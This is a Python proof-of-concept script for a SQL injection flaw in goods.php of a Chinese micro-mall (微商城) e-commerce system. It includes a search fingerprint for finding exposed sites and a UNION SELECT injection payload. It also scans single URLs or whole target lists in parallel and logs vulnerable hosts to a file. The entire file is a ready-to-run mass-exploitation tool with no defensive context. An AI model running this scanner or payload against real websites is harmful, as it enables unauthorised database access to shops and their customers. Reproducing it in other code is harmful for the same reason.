#微商城系统 goods.php SQL注入漏洞
#body="/Mao_Public/layer/layer.js"

import requests,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
   
    parse = argparse.ArgumentParser(description="微商城系统 goods.php SQL注入漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help='Please input url')
    parse.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    args = parse.parse_args()
   
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
            mp = Pool(10)
            mp.map(poc, url_list)
            mp.close()
            mp.join()
    else:
        pass


def poc(target):
    
    payload = "/goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(1)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"



    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1',
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
    }
        
    try:
        # print(22222)
        res1 = requests.get(url=target+payload,headers=headers,timeout=10,verify=False)
        # print(1111)
        # print(res1.text)
        if '商品详情' in res1.text:
            print(target+'存在sql注入')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main() # 主函数